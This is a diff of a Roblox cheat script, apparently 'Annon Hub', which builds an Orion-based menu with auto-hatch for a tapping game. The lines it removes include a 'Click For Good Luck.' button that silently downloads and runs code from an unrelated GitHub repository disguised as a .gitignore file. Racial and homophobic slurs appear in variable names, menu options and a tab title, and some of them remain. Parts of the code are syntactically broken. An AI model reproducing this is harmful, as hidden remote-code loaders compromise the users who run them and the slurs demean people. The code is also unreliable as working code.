@@ -58,7 +58,7 @@ _G.autoHatch = true -- Tapping Legends X
 
 
 _G.sliderString = "string" -- slider string
-_G.niggaPass = "3: dumb niggas haha"
+_G.dogPass = "Dog Hub :)"
 
 
 
@@ -108,65 +108,6 @@ while _G.autoHatch == true do
    wait(.000000000000000000000001)
 end
 end
-
-
-
-
---[[
-██████╗░██████╗░░█████╗░███████╗██╗██╗░░░░░███████╗
-██╔══██╗██╔══██╗██╔══██╗██╔════╝██║██║░░░░░██╔════╝
-██████╔╝██████╔╝██║░░██║█████╗░░██║██║░░░░░█████╗░░
-██╔═══╝░██╔══██╗██║░░██║██╔══╝░░██║██║░░░░░██╔══╝░░
-██║░░░░░██║░░██║╚█████╔╝██║░░░░░██║███████╗███████╗
-╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚══════╝╚══════╝
-]]
-
-local Profile = Window:MakeTab({
-	Name = "Profile",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-local Section = Profile:AddSection({
-	Name = "Welcome "..Player.Name.."."
-})
-Profile:AddParagraph("Profile","Annon Hub iS the best hub ofc ;) made by Annon#7747 UwW")
-local Section = Profile:AddSection({
-	Name = "Whats Annon Hub For"
-})
-Profile:AddDropdown({
-	Name = "Down",
-	Default = "1: Drop Down here haha",
-	Options = {"1: Drop Down here haha", "2: print that value bitch", "3: dumb niggas haha"},
-	Callback = function(Value)
-		_G.sliderString = Value
-	end    
-})
-
-Profile:AddButton({
-	Name = "Value",
-	Callback = function()
-      		if_sliderString == _G.niggaPass then
-		niggaPass()
-		else
-			
-  	end    
-})
-
-
-
-
-
-Profile:AddButton({
-	Name = "Click For Good Luck.",
-	Callback = function()
-      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Ip/main/.gitignore'),true))()
-  	end    
-})
-
-
-
-
-
 
 
 --[[
@@ -554,6 +495,32 @@ end
 
 
 
+-- RANDOM IGNORE
+local Section = Other:AddSection({
+	Name = "Section"
+})
+Other:AddParagraph("Profile","Annon Hub iS the best hub ofc ;) made by Annon#7747 UwW")
+local Section = Other:AddSection({
+	Name = "Whats Annon Hub For"
+})
+Other:AddDropdown({
+	Name = "Down",
+	Default = "click me "..Player.Name.."",
+	Options = {"click me "..Player.Name.."", "print that Value", "Dog Hub :)"},
+	Callback = function(Value)
+		_G.sliderString = Value
+	end    
+})Other:AddButton({
+	Name = "Button!",
+	Callback = function()
+      		if _G. sliderString == _G.dogPass then
+      		    dogPass()
+      		end    
+  end
+})
+
+
+
 
 --[[
 █ █▄░█ █▀▀ █▀█
@@ -641,7 +608,6 @@ Settings:AddButton({
 })
 
 
-
 OrionLib:Init()
 
 
@@ -704,7 +670,14 @@ specials(webhook, msg, botname)
 OrionLib:Init()
 
 
-function niggaPass()
+
+
+
+
+
+
+
+function dogPass()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Title of the library", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
@@ -714,15 +687,3 @@ local Nigga = Window:MakeTab({
 	PremiumOnly = false
 })
 end
-
-function noniggaPass()
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Title of the library", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
-
-local Nigga = Window:MakeTab({
-	Name = ""..Player.Name.." is a faggot",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-end
-
